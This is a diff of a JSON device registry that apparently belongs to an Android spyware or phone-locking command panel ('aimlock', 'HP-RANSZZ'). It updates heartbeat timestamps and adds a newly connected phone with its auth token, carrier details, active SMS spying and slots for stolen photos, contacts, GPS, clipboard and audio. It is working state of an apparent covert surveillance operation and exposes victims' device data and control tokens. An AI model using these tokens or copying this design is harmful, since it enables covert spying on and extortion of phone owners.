@@ -36,7 +36,7 @@
     "deviceName": "HP-LOCK-F00B",
     "ownerUsername": "Riz99",
     "token": "16f4a0bcfda1d2b0cee9ad894d0286d0",
-    "lastSeen": 1775781452263,
+    "lastSeen": 1775781470186,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-09T16:24:02.368Z",
@@ -2594,7 +2594,7 @@
     "deviceName": "HP-RANSZZ-5B45",
     "ownerUsername": "RANSZZ",
     "token": "5254feb49c7af70650dd79eaee46dffd",
-    "lastSeen": 1775781451273,
+    "lastSeen": 1775781472312,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-09T18:28:35.828Z",
@@ -5255,5 +5255,37 @@
       ],
       "receivedAt": 1775762105601
     }
+  },
+  {
+    "deviceId": "aimlock_12db1d48",
+    "deviceName": "HP-AMBON11-B9A3",
+    "ownerUsername": "gehgtg17",
+    "token": "e43e6a8e7a8c813dde322c0c8163e62a",
+    "lastSeen": 1775781472701,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-10T00:37:52.701Z",
+    "deviceInfo": {
+      "model": "vivo vivo Y17",
+      "androidVersion": "Android 9",
+      "battery": 60,
+      "network": "Seluler: Smartfren 100% untuk Indonesia",
+      "sim1": "Smartfren 100% untuk Indonesia — smartfren",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
